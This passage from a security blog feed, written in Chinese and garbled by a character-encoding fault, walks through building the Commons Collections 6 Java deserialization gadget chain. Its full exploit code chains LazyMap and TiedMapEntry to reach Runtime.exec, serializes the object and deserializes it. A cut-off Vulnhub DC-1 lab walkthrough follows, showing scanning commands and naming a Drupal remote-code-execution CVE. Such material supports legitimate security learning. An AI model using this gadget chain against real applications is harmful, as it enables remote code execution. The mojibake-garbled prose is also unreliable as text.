class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//ä¼ å…¥LazyMapå°±å’Œåé¢è¿èµ·æ¥äº†ï¼Œå³è°ƒç”¨çš„æ˜¯LazyMapçš„getæ–¹æ³•  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        tiedMapEntry.getValue();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼¹å‡ºæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430104.png" alt="image-20230507143003991"><br>ç„¶åå°±æ˜¯ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œçœ‹è°è°ƒç”¨äº† <code>TiedMapEntry</code> ä¸­çš„ <code>getValue()</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ¯”è¾ƒå¸¸è§ï¼Œæ‰€ä»¥å°±æ˜¯å…ˆçœ‹åŒç±»ä¸‹æœ‰æ²¡æœ‰è°ƒç”¨ï¼Œæœ€åå‘ç°åŒç±»ä¸‹çš„hashCodeæ–¹æ³•è°ƒç”¨äº†<code>getValue()</code> æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430087.png" alt="image-20230507143025027"><br>è€Œæ‰¾åˆ°hashCodeæ–¹æ³•åå°±æ˜¯æ‰¾è°è°ƒç”¨äº†hashCodeæ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸ç”¨ç»§ç»­æ‰¾äº†ï¼Œå› ä¸ºåœ¨Javaååºåˆ—åŒ–ä¸­hashCodeæ–¹æ³•åé¢çš„åˆ©ç”¨é“¾åŸºæœ¬éƒ½æ˜¯ä¸‹é¢è¿™æ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put() --è‡ªåŠ¨è°ƒç”¨--&gt;   HashMap.hash()</span><br><span class="line">åç»­åˆ©ç”¨é“¾.hashCode()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430291.png" alt="image-20230507143036238"><br>ç„¶ååˆ©ç”¨hashæ–¹æ³•å†™exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//ä¼ å…¥LazyMapå°±å’Œåé¢è¿èµ·æ¥äº†ï¼Œå³è°ƒç”¨çš„æ˜¯LazyMapçš„getæ–¹æ³•  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putæ–¹æ³•é‡Œé¢ä¼šè°ƒç”¨hashæ–¹æ³•  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸€ä¸‹ç°åœ¨çš„EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//ä¼ å…¥LazyMapå°±å’Œåé¢è¿èµ·æ¥äº†ï¼Œå³è°ƒç”¨çš„æ˜¯LazyMapçš„getæ–¹æ³•  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putæ–¹æ³•é‡Œé¢ä¼šè°ƒç”¨hashæ–¹æ³•  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ³¨é‡Šæ‰ååºåˆ—åŒ–åè¿˜æ˜¯èƒ½å¼¹å‡ºè®¡ç®—å™¨ï¼Œè¿™è‚¯å®šæ˜¯æœ‰é—®é¢˜çš„ï¼Œè¿™é‡Œå’ŒURLDNSçš„æ€æƒ³å…¶å®å·®ä¸å¤šï¼Œåœ¨æ‰§è¡Œ <code>put()</code> æ–¹æ³•çš„æ—¶å€™ï¼Œé‡Œé¢ä¹Ÿä¼šæ‰§è¡Œhashæ–¹æ³•ä½†æ˜¯è¦çš„æ˜¯readObjecté‡Œé¢çš„putValä¸­è°ƒç”¨çš„hashæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ä¸‹é¢è¿™æ¡è¯­å¥çš„å‚æ•°å³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼ è¿›å»ä¸€ä¸ªæ²¡ç”¨çš„å‚æ•°ï¼Œç„¶åååºåˆ—åŒ–çš„æ—¶å€™å†é‡æ–°èµ‹å€¼å°±è¡Œï¼Œæ”¹ä¸ºä¸‹é¢è¿™æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>putå®Œä¹‹åé€šè¿‡åå°„å†æ”¹å›æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ”¹å®Œä¹‹åååºåˆ—åŒ–ä¹Ÿä¸å¼¹è®¡ç®—å™¨äº†ï¼Œä¸‹ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430225.png" alt="image-20230507143052175"><br>æœ€ç»ˆé—®é¢˜å‡ºåœ¨LazyMapä¸‹çš„getæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431873.png" alt="image-20230507143107809"><br>putçš„æ—¶å€™ä¼šä¼ å…¥ä¸€ä¸ªkeyååºåˆ—åŒ–æ— æ³•è¿›å…¥ifæ‰§è¡Œtransformæ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦åˆ æ‰è¿™ä¸ªkey</p><h2 id="æœ€ç»ˆEXP"><a href="#æœ€ç»ˆEXP" class="headerlink" title="æœ€ç»ˆEXP"></a>æœ€ç»ˆEXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">        <span class="comment">//ä¼ å…¥LazyMapå°±å’Œåé¢è¿èµ·æ¥äº†ï¼Œå³è°ƒç”¨çš„æ˜¯LazyMapçš„getæ–¹æ³•  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putæ–¹æ³•é‡Œé¢ä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬è¦çš„æ˜¯putValé‡Œé¢çš„hashæ–¹æ³•å¯¹keyè¿›è¡Œè®¡ç®—  </span></span><br><span class="line">        <span class="comment">//æ‰€ä»¥å°±éœ€è¦é€šè¿‡åå°„å¯¹putæ”¹å€¼ï¼Œè®©ä»–ä¸è§¦å‘è¿™æ¡é“¾  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431402.png" alt="image-20230507143122325"><br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ideaçš„è®¾ç½®é—®é¢˜ï¼Œåœ¨ IDEA è¿›è¡Œ debug è°ƒè¯•çš„æ—¶å€™ï¼Œä¸ºäº†å±•ç¤ºå¯¹è±¡çš„é›†åˆï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ <code>toString()</code> æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨åˆ›å»º <code>TiedMapEntry</code> çš„æ—¶å€™ï¼Œå°±è‡ªåŠ¨è°ƒç”¨äº† <code>getValue()</code> æœ€ç»ˆå°†é“¾å­èµ°å®Œï¼Œç„¶åå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431521.png" alt="image-20230507143138470"><br>è®¾ç½®æˆè¿™æ ·å°±è¡Œ</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashMap.hash()</span><br><span class="line">TiedMapEntry.hashCode()</span><br><span class="line">TiedMapEntry.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431635.png" alt="image-20230507143149592"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ¡é“¾å­å‚è€ƒåšå®¢è·Ÿåˆ°ä¸€åŠæä¸æ‡‚äº†ç„¶åå»çœ‹ç™½æ—¥æ¢¦ç»„é•¿çš„è§†é¢‘åˆç†äº†ä¸€ä¸‹æ‰å®Œæˆè¿™æ¡é“¾å­ï¼Œä¸å¾—ä¸è¯´ç™½æ—¥æ¢¦ç»„é•¿è®²çš„ç¡®å®ç»†</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC-1</title>
      <link href="/undefined/15359.html"/>
      <url>/undefined/15359.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/">å®˜ç½‘ç›´æ¥ä¸‹è½½zip</a></p><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é¦–å…ˆæ‰«æä¸€ä¸‹ä¸»æœºå­˜æ´»çœ‹ä¸€ä¸‹é¶æœºIPï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332767.png" alt="image-20230503133212652"><br>æœ€åç¡®å®šé¶æœºIPä¸º192.168.75.133å¯ä»¥ä¸€ä¸ªä¸ªè®¿é—®ç¡®å®šï¼Œä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹é¶æœºçš„macåœ°å€ç¡®å®š<br>è®¿é—®å¾—åˆ°å¦‚ä¸‹é¡µé¢<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332069.png"><br>è¿™ä¸ªDrupalæœ‰ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œçš„cveä¸ºCVE-2018-7600ï¼Œå½“ç„¶è¿˜ä¸çŸ¥é“ç‰ˆæœ¬å¯¹ä¸å¯¹ï¼Œä¸è¿‡å…ˆä¸æ€¥ç€çœ‹è¿™ä¸ªCVEï¼Œç”¨nmapæ‰«æä¸€ä¸‹å¼€æ”¾çš„ç«¯å£<br><code>nmap -A 192.168.75.133</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332578.png" 